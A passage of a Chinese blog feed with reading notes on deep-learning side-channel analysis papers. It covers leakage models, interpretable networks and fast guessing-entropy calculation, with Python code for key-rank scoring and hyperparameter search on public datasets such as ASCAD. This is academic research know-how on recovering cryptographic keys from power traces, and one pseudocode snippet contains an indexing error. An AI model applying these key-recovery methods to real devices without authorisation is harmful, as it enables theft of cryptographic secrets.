class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>， 令<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>k</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>d</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y=f(k_i, d_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，泄露函数为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ψ</mi></mrow><annotation encoding="application/x-tex">\psi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">ψ</span></span></span></span>，噪声<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span>服从正态分布，标签值则对应为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ψ</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>+</mo><mi>Z</mi></mrow><annotation encoding="application/x-tex">\psi(y) + Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">ψ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span>。</p>
<h2 id="多比特建模">多比特建模</h2>
<p>每个字节都对应8个bit，相较于HW，多比特建模把所有bit都考虑在内，而且并不需要了解某个bit的重要性。</p>
<h2 id="仿真">仿真</h2>
<p><img src="../img/image-20240426105821127.png" alt="泄露模型"></p>
<p>上图是四种不同的泄露模型，HW跟ID泄露模型已有实现的代码，贴出来自己写的case3与case4的伪代码，这里+z并不知道要如何体现出来，应该是不用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">y</span>):</span><br><span class="line">  <span class="keyword">return</span> binarr(y) <span class="comment">#将y转为二进制数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">case3</span>(<span class="params">y</span>):</span><br><span class="line">  leak = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">6</span>):</span><br><span class="line">    leak += b(y)</span><br><span class="line">  <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">case4</span>(<span class="params">y</span>):</span><br><span class="line">  leak_1 = <span class="number">0</span></span><br><span class="line">  leak_2 = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">      leak_1 = b(y)[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      leak_1 *= b(y)[i]</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">4</span>:</span><br><span class="line">      leak_2 = b[y][j]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      leak_2 *= b[y][j]</span><br><span class="line">  <span class="keyword">return</span> leak_1 + leak_2</span><br></pre></td></tr></table></figure>
<h2 id="实验结果">实验结果</h2>
<blockquote>
<p>这个计算方法需要等公开源码了再看</p>
</blockquote>
<img src="../img/image-20240426121006972.png" alt="HW&ID泄露模型对单独计算每个bit的准确率" style="zoom:50%;" />
<p><img src="../img/image-20240426145948933.png" alt="攻击效果"></p>
<p><img src="../img/image-20240426150023815.png" alt="四个数据集上多Bit多任务模型攻击结果"></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>Lennert Wouters, Victor Arribas, Benedikt Gierlichs, and Bart Preneel. Revisiting a methodology for efficient cnn architectures in profiling attacks. IACR Transactions on Cryptographic Hardware and Embedded Systems , 2020(3):147– 168, Jun. 2020. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>泄露模型</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-Peek into the Black-Box:Interpretable Neural Network using SAT Equations in Side-Channel Analysis</title>
    <url>/archives/14e98e24.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Trevor Yap, Adrien Benamira, Shivam Bhasin and Thomas Peyrin</strong></p>
</li>
<li>
<p>单位：<strong>School of Physical and Mathematical Sciences, Nanyang Technological University, Singapore</strong></p>
</li>
<li>
<p>出处：<strong>IACR Transactions on Cryptographic Hardware and Embedded Systems ISSN 2569-2925, Vol. 2023, No. 2, pp. 24–53.</strong></p>
</li>
<li>
<p>标题：<strong>Peek into the Black-Box: Interpretable Neural Network using SAT Equations in Side-Channel Analysis</strong></p>
</li>
<li>
<p>日期：<strong>2023</strong></p>
</li>
</ul>
<h1>文章内容</h1>
<blockquote>
<p>本文基于TT-DCNN转化为SAT方程来对侧信道攻击过程完成解释</p>
</blockquote>
<h2 id="研究背景">研究背景</h2>
<p>与经典侧信道攻击相比，基于深度学习的侧信道攻击在存在掩码等防御措施的情况下，仅需简单的预处理技术即可完成攻击。由于神经网络黑盒的特性，攻击者并不知道到底是什么因素导致了攻击的成功或失败，亦或是模型基于哪些兴趣点来完成了攻击，截止目前还没有使用神经网络中提取兴趣点的理论公式。</p>
<h2 id="相关工作">相关工作</h2>
<ol>
<li>梯度可视化<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>：观察样本点中某一点变化对梯度的影响，在带掩码的能量迹上仅可以发现两个POI。</li>
<li>权重可视化<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>：利用特征图对卷积层同一时间戳的值进行平均计算，利用权重可视化方法进行全局解释。</li>
<li>SVCCA<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>：得出结论神经网络对待高斯噪声是在前几层处理的，对待更复杂的防御措施如去同步等是在后几层处理的。</li>
<li>随机攻击<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>：给出了泄露相对应的轨迹方程。</li>
</ol>
<h2 id="本文贡献">本文贡献</h2>
<ol>
<li>提出针对一维数据的TT-DCNN模型，能够在0-3阶掩码的能量迹上定位兴趣点。</li>
<li>改进一维数据TT-DCNN为TTSCA<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mrow><mi>b</mi><mi>i</mi><mi>g</mi></mrow></msub></mrow><annotation encoding="application/x-tex">_{big}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6222em;vertical-align:-0.2861em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">bi</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>， 对长能量迹完成攻击。</li>
<li>利用SAT方程来完成全局解释。</li>
</ol>
<h2 id="真值表神经网络TT-DCNN">真值表神经网络TT-DCNN</h2>
<p>作者将TT-DCNN的卷积层转为一维的，如图1图2所示，在首个卷积层后接一个1x1的卷积层，前一层的激活函数为Selu，后一层为bin。</p>
<img src="../img/image-20240606105401210.png" alt="图1 真值表转化实例" style="zoom:50%;" />
<img src="../img/image-20240606105416560.png" alt="图2 转换具体流程与卷积块结构" style="zoom:50%;" />
<h2 id="DNF方程分析方法">DNF方程分析方法</h2>
<p>作者利用三种方法优化神经网络恢复密钥最小的规则集合：</p>
<ol>
<li>基于析取项的大小来精简：去掉过大的析取项防止过拟合。</li>
<li>基于样本点组合的筛选：析取项根据包含的不同样本点进行分类，目的是为了查看哪些兴趣点对密钥恢复起作用。</li>
<li>基于样本点的删减：有一些析取项包含了不重要的样本点，逐项检查每个样本点的影响，可以找到对猜测熵影响最大的样本点集合。</li>
</ol>
<h2 id="算法1">算法1</h2>
<img src="../img/image-20240620152035829.png" alt="image-20240620152035829" style="zoom:50%;" />
<p>作者在算法1中实际上是做了一个类似mask的操作，掩掉某些合取项，通过判断GE的收敛趋势来确定该合取项是否对模型有用。</p>
<img src="../img/image-20240606105554563.png" alt="image-20240606105554563" style="zoom:50%;" />
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>Loïc Masure, Cécile Dumas, and Emmanuel Prouff. Gradient Visualization for General Characterization in Profiling Attacks. In Ilia Polian and Marc Stöttinger, editors, Constructive Side-Channel Analysis and Secure Design, pages 145–167, Cham, 2019. Springer International Publishing. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p>Gabriel Zaid, Lilian Bossuet, Amaury Habrard, and Alexandre Venelli. Methodology for Efficient CNN Architectures in Profiling Attacks. IACR Transactions on Cryptographic Hardware and Embedded Systems, 2020(1):1–36, Nov. 2019. <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p>Daan van der Valk, Stjepan Picek, and Shivam Bhasin. Kilroy Was Here: The First Step Towards Explainability of Neural Networks in Profiled SideChannel Analysis. In Guido Marco Bertoni and Francesco Regazzoni, editors, Constructive Side-Channel Analysis and Secure Design, pages 175–199, Cham, 2021. Springer International Publishing. <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn4" class="footnote-item"><p>Gabriel Zaid, Lilian Bossuet, Mathieu Carbone, Amaury Habrard, and Alexandre Venelli. Conditional Variational AutoEncoder based on Stochastic Attack. Cryptology ePrint Archive, Report 2022/232, 2022. <a href="https://ia.cr/2022/232">https://ia.cr/2022/232</a>. <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>泄漏检测</tag>
      </tags>
  </entry>
  <entry>
    <title>换服务器啦！</title>
    <url>/archives/e8b8df3e.html</url>
    <content><![CDATA[<p>之前那个服务器实在是太卡了，网站总是刷不出来，今天晚上斥巨资整了一个99的遥遥领先云，真爽！！！</p>
]]></content>
      <tags>
        <tag>小饼干</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义侧信道攻击中的网格搜索超参数方法</title>
    <url>/archives/cfed1ff3.html</url>
    <content><![CDATA[<h1>自定义侧信道攻击中的网格搜索超参数方法</h1>
<p>在侧信道攻击中使用的超参搜索方法均为for循环，最近在训练AE时发现sklearn有现成的greph方法来完成网格调参，但是自带的方法自由度较低，且在判定超参好坏时并没有考虑到侧信道攻击并不主要以acc来判定模型的攻击效率，这里引入sklearn中的<code>ParameterGrid</code>方法来完成自定义构造。</p>
<blockquote>
<p>Python: 3.8.16	Sklearn==1.0.2</p>
</blockquote>
<ul>
<li>Monkey_search方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">monkey_search</span>(<span class="params">data, params, model, callbacks, key, shuffle=<span class="literal">True</span>, pred_size=<span class="number">5000</span>, verbose=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(callbacks) == <span class="built_in">list</span></span><br><span class="line">    train_data, test_data = data[<span class="string">&#x27;train_data&#x27;</span>], data[<span class="string">&#x27;test_data&#x27;</span>]</span><br><span class="line">    idx = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i, callback <span class="keyword">in</span> <span class="built_in">enumerate</span>(callbacks):</span><br><span class="line">        <span class="keyword">if</span> callback.__class__.__name__ == <span class="string">&#x27;OneCycleLR&#x27;</span>:</span><br><span class="line">            idx = i</span><br><span class="line"></span><br><span class="line">    candidatas = ParameterGrid(param_grid=params)</span><br><span class="line">    <span class="keyword">for</span> index, candidata <span class="keyword">in</span> <span class="built_in">enumerate</span>(candidatas):</span><br><span class="line">        x_train, x_val, y_train, y_val = train_test_split(train_data[<span class="number">0</span>], train_data[<span class="number">1</span>], test_size=<span class="number">0.2</span>, shuffle=<span class="literal">True</span>) <span class="keyword">if</span>(shuffle == <span class="literal">True</span>) <span class="keyword">else</span> train_test_split(train_data[<span class="number">0</span>], train_data[<span class="number">1</span>], test_size=<span class="number">0.2</span>)</span><br><span class="line">        optimizer = candidata[<span class="string">&#x27;optimizer&#x27;</span>]</span><br><span class="line">        learning_rate = candidata[<span class="string">&#x27;learning_rate&#x27;</span>]</span><br><span class="line">        epoch = candidata[<span class="string">&#x27;epoch&#x27;</span>]</span><br><span class="line">        batch_size = candidata[<span class="string">&#x27;batch_size&#x27;</span>]</span><br><span class="line">        loss = candidata[<span class="string">&#x27;loss&#x27;</span>]</span><br><span class="line">        <span class="comment"># 如果有onecycle要给对应赋值</span></span><br><span class="line">        <span class="keyword">if</span> idx != <span class="literal">None</span>:</span><br><span class="line">            callbacks[idx].num_samples = x_train.shape[<span class="number">0</span>]</span><br><span class="line">            callbacks[idx].batch_size = batch_size</span><br><span class="line">            callbacks[idx].max_lr = learning_rate</span><br><span class="line">        model.<span class="built_in">compile</span>(optimizer=optimizer, loss=loss, metrics=[<span class="string">&#x27;acc&#x27;</span>])</span><br><span class="line">        model.optimizer.learning_rate.assign(learning_rate)</span><br><span class="line">        model.fit(x_train, y_train, validation_data=(x_val, y_val), callbacks=callbacks, epochs=epoch, batch_size=batch_size)</span><br><span class="line"></span><br><span class="line">        ranks = np.zeros((<span class="number">10</span>, pred_size))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ranks.shape[<span class="number">0</span>]):</span><br><span class="line">            ranks[i] = mean_rank_score(model, test_data, pred_size=pred_size, key=key)</span><br><span class="line">        <span class="keyword">if</span> verbose == <span class="number">1</span>:</span><br><span class="line">            show_result(ranks, optimizer, learning_rate, epoch, batch_size, loss)</span><br></pre></td></tr></table></figure>
<p>该方法接收参数格式如下：</p>
<p><code>data：&#123;&quot;train_data&quot;: [x_train, y_train], &quot;test_data&quot;: [x_test, y_test]&#125;</code></p>
<p><code>params:&#123;&quot;optmizer&quot;: [string], &quot;learning_rate:&quot;[int],&quot;epoch&quot;:[int],&quot;batch_size&quot;:[int], &quot;loss&quot;:[string] &#125;</code></p>
<p><code>callbacks:&#123;callback_function&#125;</code></p>
<p><code>key: test_key int</code></p>
<p><code>model: model object</code></p>
<ul>
<li>Mean_rank_score 	计算猜测熵</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mean_rank_score</span>(<span class="params">model, test_data, pred_size, key</span>):</span><br><span class="line">    attack_traces, targets = test_data[<span class="number">0</span>], test_data[<span class="number">1</span>]</span><br><span class="line">    predictions = model.predict(attack_traces, verbose=<span class="number">0</span>)</span><br><span class="line">    predictions = np.log(predictions + <span class="number">1e-40</span>)</span><br><span class="line">    <span class="comment">#! 可能需要修改</span></span><br><span class="line">    rank_times = np.zeros(pred_size)</span><br><span class="line">    pred = np.zeros(<span class="number">256</span>)</span><br><span class="line">    idx = np.random.randint(predictions.shape[<span class="number">0</span>], size=pred_size)    </span><br><span class="line">    <span class="keyword">for</span> i, p <span class="keyword">in</span> <span class="built_in">enumerate</span>(idx):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(pred.shape[<span class="number">0</span>]):</span><br><span class="line">            pred[k] += predictions[p, targets[p, k]]</span><br><span class="line">        ranked = np.argsort(pred)[::-<span class="number">1</span>]</span><br><span class="line">        rank_times[i] = <span class="built_in">list</span>(ranked).index(key)</span><br><span class="line">    <span class="keyword">return</span> rank_times</span><br></pre></td></tr></table></figure>
<ul>
<li>show_result	展示密钥排序</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show_result</span>(<span class="params">rank_times, optmizier, learning_rate, epoch, batch_size, loss</span>):</span><br><span class="line">    fig, ax = plt.subplots(figsize=(<span class="number">15</span>, <span class="number">7</span>))</span><br><span class="line">    plt.title(<span class="string">&quot;optmizer:&quot;</span> + <span class="built_in">str</span>(optmizier) + <span class="string">&#x27;_&#x27;</span> + <span class="built_in">str</span>(learning_rate) + <span class="string">&#x27;_epoch:&#x27;</span> + <span class="built_in">str</span>(epoch) + <span class="string">&#x27;_batch&#x27;</span> + <span class="built_in">str</span>(batch_size) + <span class="string">&#x27;_loss: &#x27;</span>+ <span class="built_in">str</span>(loss))</span><br><span class="line">    x = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5000</span>)]</span><br><span class="line">    ax.plot(x, np.mean(rank_times, axis=<span class="number">0</span>), <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    ax.<span class="built_in">set</span>(xlabel=<span class="string">&quot;number of traces&quot;</span>, ylabel=<span class="string">&quot;mean rank&quot;</span>)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
<p>完整代码在：<a href="https://github.com/i4mhmh/A-custom-gridSearch-method-in-SCA">https://github.com/i4mhmh/A-custom-gridSearch-method-in-SCA</a></p>
]]></content>
      <categories>
        <category>侧信道攻击</category>
      </categories>
      <tags>
        <tag>小饼干</tag>
      </tags>
  </entry>
  <entry>
    <title> 文献阅读笔记-The Need for Speed: A Fast Guessing Entropy Calculation for Deep Learning-Based SCA</title>
    <url>/archives/363b922e.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Guilherme Perin, Lichao Wu and Stjepan Picek</strong></p>
</li>
<li>
<p>单位：<strong>Leiden Institute of Advanced Computer Science (LIACS), Leiden University, Niels Bohrweg 1, 2333 CA Leiden, The Netherlands;Faculty of Electrical Engineering, Mathematics &amp; Computer Science, Delft University of Technology, Mekelweg 5, 2628 CD Delft, The Netherlands; Digital Security Group, Radboud University, Houtlaan 4, 6525 XZ Nijmegen, The Netherlands</strong></p>
</li>
<li>
<p>出处：<strong>algorithms</strong></p>
</li>
<li>
<p>标题：<strong>The Need for Speed: A Fast Guessing Entropy Calculation for Deep Learning-Based SCA</strong></p>
</li>
<li>
<p>日期：<strong>2023年2月23日</strong></p>
</li>
</ul>
<h1>背景</h1>
<p>目前，侧信道攻击研究者们为了缩短训练所需时长，通常采用减小模型容量或者缩小训练集等方法，但此类方法会影响模型的泛化性能以及可学习性。ES（early stopping）作为一种有效监控模型训练以及防止过拟合的方案，它通过监控模型的损失值来完成对模型性能的监控，而在<code>侧信道攻击</code>中，模型的性能与损失值并没有绝对的对应关系。<strong>猜测熵</strong>作为侧信道攻击常用评估方案，使用猜测熵来作为ES的指标是可行的，但是由于计算猜测熵所需的时间开销过大，因此在超参数搜索时往往会导致搜索时间过长，在极端的情况下是不可行的。</p>
<h1>内容</h1>
<h2 id="相关工作">相关工作</h2>
<p>Zhang等人<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>提出了一种猜测熵估计算法<em>GEEA</em>，缩短了计算猜测熵的时间，Perin等人<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>利用互信息方法来检测模型训练在某个Epoch时的性能。</p>
<h2 id="主要工作">主要工作</h2>
<p>在每个Epoch结束后快速计算一次猜测熵FGE，通过判断猜测熵在哪个epoch最小。</p>
<img src="../img/image-20240422152154193.png" alt="流程" style="zoom:67%;" />
<img src="../img/image-20240422152225009.png" alt="FGE与GE的结果" style="zoom:50%;" />
<p>可以看到使用FGE作为指标的模型猜测熵收敛到1的速度更快。</p>
<p>FGE关键代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># guessing entropy and success rate</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fast_ge</span>(<span class="params">runs, nt_kr, model, x_attack, labels_key_hypothesis, correct_key, leakage_model</span>):</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    nt = <span class="built_in">len</span>(x_attack)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -----------------------#</span></span><br><span class="line">    <span class="comment"># predict output probabilities for shuffled test or validation set</span></span><br><span class="line">    <span class="comment"># -----------------------#</span></span><br><span class="line">    output_probabilities = np.log(model.predict(x_attack) + <span class="number">1e-36</span>)</span><br><span class="line">    key_ranking_sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> leakage_model == <span class="string">&quot;HW&quot;</span>:</span><br><span class="line">        probabilities_kg_all_traces = np.choose(labels_key_hypothesis, output_probabilities.T).T</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        probabilities_kg_all_traces = np.zeros((nt, <span class="number">256</span>))</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(nt):</span><br><span class="line">            probabilities_kg_all_traces[index] = output_probabilities[index][</span><br><span class="line">                np.asarray([<span class="built_in">int</span>(leakage[index]) <span class="keyword">for</span> leakage <span class="keyword">in</span> labels_key_hypothesis[:]])</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ------------------------#</span></span><br><span class="line">    <span class="comment"># run key rank &quot;runs&quot; times and average results.</span></span><br><span class="line">    <span class="comment"># ------------------------#</span></span><br><span class="line">    <span class="keyword">for</span> run <span class="keyword">in</span> <span class="built_in">range</span>(runs):</span><br><span class="line">        r = np.random.choice(<span class="built_in">range</span>(nt), nt_kr, replace=<span class="literal">False</span>)</span><br><span class="line">        probabilities_kg_all_traces_shuffled = probabilities_kg_all_traces[r]</span><br><span class="line">        key_probabilities = np.<span class="built_in">sum</span>(probabilities_kg_all_traces_shuffled[:nt_kr], axis=<span class="number">0</span>)</span><br><span class="line">        key_probabilities_sorted = np.argsort(key_probabilities)[::-<span class="number">1</span>]</span><br><span class="line">        key_ranking_sum += <span class="built_in">list</span>(key_probabilities_sorted).index(correct_key) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    guessing_entropy = key_ranking_sum / runs</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;GE = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(guessing_entropy))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> guessing_entropy, time.time() - start_time</span><br></pre></td></tr></table></figure>
<p>这里贴出来<code>mlscat</code>计算猜测熵源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rank</span>(<span class="params">predictions, num_traces, targets, key, interval=<span class="number">1</span></span>):</span><br><span class="line">    rank_time = np.zeros(<span class="built_in">int</span>(num_traces/interval))</span><br><span class="line">    pred = np.zeros(<span class="number">256</span>)</span><br><span class="line">    idx = np.random.randint(predictions.shape[<span class="number">0</span>], size=num_traces)</span><br><span class="line">    <span class="keyword">for</span> i, p <span class="keyword">in</span> <span class="built_in">enumerate</span>(idx):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(predictions.shape[<span class="number">1</span>]): <span class="comment">#256</span></span><br><span class="line">            pred[k] += predictions[p, targets[p, k]]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> i % interval == <span class="number">0</span>:</span><br><span class="line">            ranked = np.argsort(pred)[::-<span class="number">1</span>]</span><br><span class="line">            rank_time[<span class="built_in">int</span>(i/interval)] = <span class="built_in">list</span>(ranked).index(key)</span><br><span class="line">    <span class="keyword">return</span> rank_time</span><br></pre></td></tr></table></figure>
<p><em>fast_ge</em>在拿到predictions后直接对其做了映射，假设密钥$$k_i=1$$，对应的$$predictions_i[1]$$就是该密钥的预测概率，也就是位置与密钥值相等，在下方for循环中计算概率和时直接进行了累加，最后取排名均值。</p>
<p>代码看不出有什么区别，最后在传参处发现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">callback_fast_ge = Callback_EarlyStopping(number_of_traces_key_rank,X_validation_reshape[:validation_traces_fast],labels_key_hypothesis[:, :validation_traces_fast], correct_key, leakage_model)</span><br><span class="line">callback_slow_ge = </span><br><span class="line">Callback_EarlyStopping(validation_traces, X_validation_reshape, labels_key_hypothesis, correct_key,</span><br><span class="line">                                                  leakage_model)</span><br><span class="line"></span><br><span class="line"><span class="comment">#validation_traces_fast = 500</span></span><br></pre></td></tr></table></figure>
<p>这里fastge传的是500个。</p>
<p>总体的方法就是这样，少量验证集完成猜测熵的快速计算。</p>
<p>接下来作者采用贝叶斯优化（BO）配合ES来完成超参数搜索，BO在keras库里有。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">script_bo_fge.py</span><br><span class="line"></span><br><span class="line">    tuner = BayesianOptimization(build_cnn_model,</span><br><span class="line">                                 objective=kt.Objective(objective, direction=direction),</span><br><span class="line">                                 max_trials=max_id,</span><br><span class="line">                                 executions_per_trial=<span class="number">1</span>,</span><br><span class="line">                                 directory=save_folder_bo,</span><br><span class="line">                                 project_name=project_folder,</span><br><span class="line">                                 overwrite=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># tuner.on_epoch_end()</span></span><br><span class="line"></span><br><span class="line">    tuner.search_space_summary()</span><br><span class="line">    tuner.search(x=X_profiling_reshape,</span><br><span class="line">                 y=Y_profiling,</span><br><span class="line">                 epochs=epochs,</span><br><span class="line">                 batch_size=batch_size,</span><br><span class="line">                 validation_data=(X_validation_reshape[:validation_traces_fast], Y_validation[:validation_traces_fast]),</span><br><span class="line">                 verbose=<span class="number">2</span>,</span><br><span class="line">                 callbacks=[callback_early_stopping])</span><br><span class="line">    tuner.results_summary()</span><br></pre></td></tr></table></figure>
<h2 id="数据集">数据集</h2>
<blockquote>
<p>黑盒</p>
</blockquote>
<table>
<thead>
<tr>
<th>名称</th>
<th>链接</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASCAD</td>
<td><a href="https://github.com/ANSSI-FR/ASCAD">https://github.com/ANSSI-FR/ASCAD</a></td>
</tr>
<tr>
<td>CHESCTF 2018</td>
<td><a href="https://chesctf.riscure.com/2018/content?show=training">https://chesctf.riscure.com/2018/content?show=training</a></td>
</tr>
</tbody>
</table>
<h2 id="模型架构">模型架构</h2>
<img src="../img/image-20240422163639707.png" alt="模型架构以及超参数组合图" style="zoom:70%;" />
<img src="../img/image-20240422163748879.png" alt="不同数据集上不同方案所需验证集数量" style="zoom:63%;" />
<h1>结果</h1>
<img src="../img/image-20240422163946531.png" alt="ASCADf数据集上汉明重量（左）以及身份泄露模型猜测熵收敛曲线" style="zoom:80%;" />
<p>在ASCAD数据集上，采用身份泄露模型，FGE方案需要101条能量迹可将猜测熵收敛为1。</p>
